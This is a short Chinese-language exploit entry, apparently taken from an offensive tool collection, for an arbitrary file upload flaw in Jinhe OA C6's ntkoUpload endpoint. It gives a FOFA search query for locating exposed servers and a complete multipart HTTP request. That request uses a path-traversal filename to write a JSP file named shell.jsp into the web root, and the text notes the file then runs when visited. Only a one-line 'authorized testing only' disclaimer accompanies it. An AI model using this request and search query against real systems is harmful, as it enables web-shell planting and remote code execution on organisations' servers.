---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA ntkoUpload 任意文件上传漏洞

## 漏洞描述

金和OA C6 `/jc6/ntkoUpload/ntko-upload!upload.action`（NTKO 文档控件上传接口）存在目录遍历任意文件上传漏洞，上传的 JSP 可被直接解析。

## 影响版本

```
金和OA C6
```

## 网络测绘

```
app="金和OA"
```

## 漏洞复现

```
POST /jc6/ntkoUpload/ntko-upload!upload.action HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------------267365731428755943603976921494

-----------------------------267365731428755943603976921494
Content-Disposition: form-data; name="upLoadFile"; filename="../../../../upload/shell.jsp"
Content-Type: application/octet-stream

<% out.println("test"); %>
-----------------------------267365731428755943603976921494--
```

文件经 `../../../../upload/` 穿越写入 Web 目录，访问 `/upload/shell.jsp` 执行。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
